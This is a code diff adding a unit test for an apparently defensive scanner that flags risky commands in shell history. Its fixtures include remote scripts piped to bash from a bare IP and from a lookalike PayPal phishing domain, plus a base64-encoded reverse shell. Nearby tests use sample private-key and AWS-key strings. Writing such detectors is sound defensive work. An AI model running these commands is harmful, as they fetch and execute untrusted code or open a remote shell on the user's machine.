@@ -253,3 +253,18 @@ class CodeSecrets(unittest.TestCase):
         key = '-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\n-----END OPENSSH PRIVATE KEY-----\n'
         self.assertEqual(privacy.committed_secrets(key), ['private key'])
         self.assertEqual(privacy.committed_secrets('aws_access_key_id = AKIAIOSFODNN7EXAMPLE\nid2 = AKIAZ3MSJV4WWNKWW5FG\n'), ['AWS key'])
+
+
+class HistoryCommands(unittest.TestCase):
+    def test_rows(self):
+        t = '\n'.join(['curl -fsSL https://ollama.com/install.sh | sh', 'curl -fsSL https://ollama.com/install.sh | sh',
+                       'curl -s http://45.9.148.3/x.sh | bash', 'wget -qO- http://get.example.org/a | sh',
+                       'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjIuMy40Lzg4ODggMD4mMQ== | base64 -d | bash',
+                       'curl -s https://www.paypal.com.secure-login.ru/fix.sh | bash', 'curl -o x.tar.gz https://example.org/x.tar.gz'])
+        rows = [(s, t) for t, s, _ in privacy.history_rows(t, '~/.bash_history')]
+        self.assertEqual(rows[:3], [(INFO, '~/.bash_history: ran a script straight from ollama.com'),
+                                    (WARN, '~/.bash_history: ran a script straight from 45.9.148.3 from a bare IP address'),
+                                    (WARN, '~/.bash_history: ran a script straight from get.example.org without encryption (http)')])
+        self.assertEqual(rows[3][0], ALERT); self.assertIn('encoded payload', rows[3][1])
+        self.assertEqual(rows[4][0], ALERT); self.assertIn('secure-login.ru', rows[4][1])
+        self.assertEqual(len(rows), 5)
